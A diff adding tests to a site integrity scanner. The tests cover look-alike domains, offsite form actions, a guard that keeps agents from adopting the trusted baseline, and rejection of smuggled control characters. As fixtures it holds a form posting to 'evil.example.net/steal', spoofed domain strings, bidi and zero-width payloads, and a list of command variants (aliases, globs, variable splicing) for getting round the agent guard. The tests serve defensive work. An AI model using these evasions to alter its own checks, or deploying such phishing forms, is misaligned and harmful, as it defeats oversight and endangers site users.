@@ -134,3 +134,44 @@ def _(d):
     write(d, ".critic/integrity-baseline.json", json.dumps({"files": {"a.html": {"own": [], "links": [], "forms": [], "origins": ["\u001b[8m", "example.net", "\u001b[0m"]}}}))
     r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d)
     assert r.returncode == 2 and "\u001b" not in r.stdout + r.stderr and "adopted" not in r.stdout, (r.returncode, repr(r.stdout[-200:]), repr(r.stderr[-200:]))
+
+@test("batch 2 review round 2: halfwidth forms are folded as a browser folds them, a lone 々 beside Latin is a look-alike, and every base form reads as a browser reads it")
+def _(d):
+    import scan_integrity as si
+    for h in ("paypaￜ.com", "paypaｴ.com", "exampﾚle.com", "paypa々.com"):
+        assert si.lookalike(h), repr(h)
+    assert not si.lookalike("ｿﾆｰ銀行.jp") and not si.lookalike("佐々木.jp"), "halfwidth Japanese with Han is still a real name"
+    rows = []
+    def emit(sev, rule, area, where, what, ev=""): rows.append((rule, where))
+    si.scan("p.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="http://cdn.example.org/">\n<form action="https:evil.example.net/steal"></form>\n', emit, d)
+    assert ("integrity-form-offsite", "p.html:3") in rows, rows
+    rows.clear()
+    si.scan("p.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="http://www.example.com/">\n<form action="//www.example.com/pay"></form>\n', emit, d)
+    assert ("integrity-form-insecure", "p.html:3") in rows, rows
+    rows.clear()
+    si.scan("p.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="">\n<base href="https://cdn.example.net/">\n<form action="/login"></form>\n<script src="/a.js"></script>\n', emit, d)
+    assert not rows, ("an empty first base keeps targets on the page's site", rows)
+
+@test("batch 2 review round 2: agents can't adopt or record the trusted copy through the wrapper functions, an alias, a line continuation, a variable or a glob")
+def _(d):
+    sys.path.insert(0, str(H)); import importlib, read_guard as rg8; importlib.reload(rg8)
+    for cmd in ("python3 -c 'import critic_scan, pathlib; critic_scan.integrity_adopt(pathlib.Path(\".\"))'",
+                "python3 -c 'import critic_scan, pathlib; critic_scan.integrity_record(pathlib.Path(\".\"), pathlib.Path(\".\"), [])'",
+                "python3 -c 'from critic_findings import record_baseline as r; r(\".\")'",
+                f"python3 {S}/critic_scan.py . \\\n --integrity-adopt", f"F=--integrity-adopt; python3 {S}/critic_scan.py . $F",
+                f"python3 {S}/crit*scan.py . --integrity-adopt", f"F=grity; python3 {S}/critic_scan.py . --inte$F-adopt"):
+        assert rg8.owner_problem(cmd, True), cmd
+    assert rg8.owner_problem(f"python3 {S}/critic_scan.py . --root . --page dist/index.html", True) is None, "the detector's own scan still runs"
+
+@test("batch 2 review round 2: adopt refuses newlines, bidi and zero-width controls and malformed fields, and record refuses a copy git tracks")
+def _(d):
+    write(d, "site/index.html", "<p>x</p>\n")
+    for bad in (["evil.example.net" + "\n" * 60 + "fake"], ["x‮ten.elpmaxe"], ["ex​ample.net"], 7):
+        write(d, ".critic/integrity-baseline.json", json.dumps({"files": {"a.html": {"own": [], "links": [], "forms": [], "origins": bad}}}))
+        r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d)
+        assert r.returncode == 2 and "adopted" not in r.stdout and "Traceback" not in r.stderr, (bad, r.returncode, r.stderr[-300:])
+    g = d / "g"; write(g, "site/index.html", "<p>x</p>\n"); subprocess.run(["git", "init", "-q"], cwd=g)
+    run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=g)
+    subprocess.run(["git", "add", "-f", ".critic/integrity-baseline.json"], cwd=g)
+    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=g)
+    assert r.returncode == 2 and "git rm --cached" in r.stderr, (r.returncode, r.stdout, r.stderr)
